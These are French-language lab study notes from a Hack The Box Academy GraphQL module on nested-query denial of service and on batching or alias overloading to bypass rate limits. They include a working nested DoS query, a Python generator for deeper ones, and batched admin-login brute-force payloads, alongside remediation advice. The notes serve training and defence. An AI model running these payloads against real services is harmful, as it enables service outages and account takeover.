---
titre: "DoS par requêtes imbriquées & Batching Attacks"
aliases:
  - "DoS par requêtes imbriquées & Batching Attacks"
plateforme: "Hack The Box Academy"
module: "Attacking GraphQL"
date: 2026-07-06
tags: [HTB, GraphQL, DoS, Batching, RateLimit, BruteForce, Notes]
---

# 💥 DoS par requêtes imbriquées & Batching Attacks

Lié : [[Attacking GraphQL - Index]] · [[02 - Fondamentaux GraphQL]] · [[09 - Cheatsheet GraphQL]]

---

## 1. DoS par requêtes imbriquées (Nested Query Attack)

### Le prérequis : une boucle dans le schéma

Si le diagramme Voyager montre une **relation circulaire** entre types :
```
UserObject ──(posts)──► PostObject ──(author)──► UserObject ──(posts)──► ...
```
→ On peut boucler indéfiniment dans une seule query.

### Pourquoi ça explose exponentiellement

À chaque niveau d'imbrication, le nombre de résolutions est **multiplié** :
- Niveau 1 : 10 posts
- Niveau 2 : 10 × 10 = 100
- Niveau 3 : 1 000
- Niveau 8 : **100 millions** de nœuds à résoudre

→ CPU/RAM saturés → plus personne d'autre ne peut utiliser le service.

C'est le même principe d'**asymétrie** que le ReDoS : une requête minuscule, un coût exponentiel.

### La query

```graphql
{
  posts {
    author {
      posts {
        edges {
          node {
            author {
              posts {
                edges {
                  node {
                    author {
                      username
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
}
```

Note : `edges → node` est la notation **Relay Connections** (convention de pagination Graphene). Si la relation est une liste simple, pas besoin de `edges/node`.

### Générateur Python

```python
def nested_dos(depth):
    inner = "author { username }"
    block = "author { posts { edges { node { %s } } } }"
    q = inner
    for _ in range(depth):
        q = block % q
    return "{ posts { %s } }" % q

print(nested_dos(10))   # profondeur ajustable
```

### Remédiation

- **Query depth limiting** : refuser au-delà de N niveaux (Graphene ne le fait pas nativement).
- **Query cost analysis** : attribuer un coût à chaque champ, plafonner le coût total.
- **Timeouts** et **pagination obligatoire** avec limites.

### ⚠️ Éthique

Un DoS **coupe réellement le service**. Ne le lancer que sur une cible autorisée (lab, scope bug bounty explicite). En engagement réel : démontrer la vuln (profondeur modérée + mesure du temps de réponse) sans tout crasher.

---

## 2. Batching — plusieurs queries en une requête HTTP

### Le mécanisme

Le body devient un **tableau JSON** de queries :

```json
[
  { "query":"{ user(username: \"admin\") { uuid } }" },
  { "query":"{ post(id: 1) { title } }" }
]
```

La réponse est une liste dans le même ordre. Seul changement : `{...}` → `[{...}, {...}]`.

### Batching ≠ vulnérabilité, mais habilitant

Le batching est une **fonctionnalité légitime** (comme `xmlrpc.php` en WordPress). Le problème : ce qu'il rend possible.

### L'exploitation : bypass de rate limit → brute-force

Le rate limit compte les **requêtes HTTP**, pas les queries GraphQL à l'intérieur.

- Rate limit : 5 req/s → 5 mots de passe/s en brute-force classique.
- **Avec batching** : 1000 queries de login dans 1 requête → 5 × 1000 = **5000 mdp/s**.

```json
[
  {"query":"{ login(user:\"admin\", password:\"password1\") { token } }"},
  {"query":"{ login(user:\"admin\", password:\"password2\") { token } }"},
  {"query":"{ login(user:\"admin\", password:\"password3\") { token } }"}
]
```

### Alias Overloading (variante dans une seule query)

Même effet sans batching, via des **alias** :
```graphql
{
  a: user(username: "admin") { password }
  b: user(username: "test")  { password }
  c: user(username: "root")  { password }
}
```
1000 alias = 1000 résolutions → DoS ou brute-force sans batching.

### Remédiation

- **Désactiver le batching** si non nécessaire.
- **Limiter le nombre de queries par batch** et d'alias par query.
- Rate-limiter au niveau de **l'opération** (par query), pas seulement par requête HTTP.

---

## 3. Autres variantes DoS

| Variante | Mécanisme | GraphQL-Cop alert |
|---|---|---|
| **Field Duplication** | 500× le même champ dans une query | `[HIGH] Field Duplication` |
| **Directive Overloading** | `@include(if:true)` dupliqué en masse | `[HIGH] Directive Overloading` |

---

## Pattern transversal

Trois mécanismes différents, un même objectif — **découpler le compteur de sécurité du nombre réel d'opérations** :

| Mécanisme | Module | Principe |
|---|---|---|
| GraphQL **batching** | Attacking GraphQL | N queries / 1 requête HTTP |
| WordPress `system.multicall` | Web Service & API Attacks | N tentatives / 1 appel xmlrpc |
| Header `X-Forwarded-For` | Web Service & API Attacks | IP différente par requête → compteur neuf |
| GraphQL **alias overloading** | Attacking GraphQL | N opérations / 1 query |
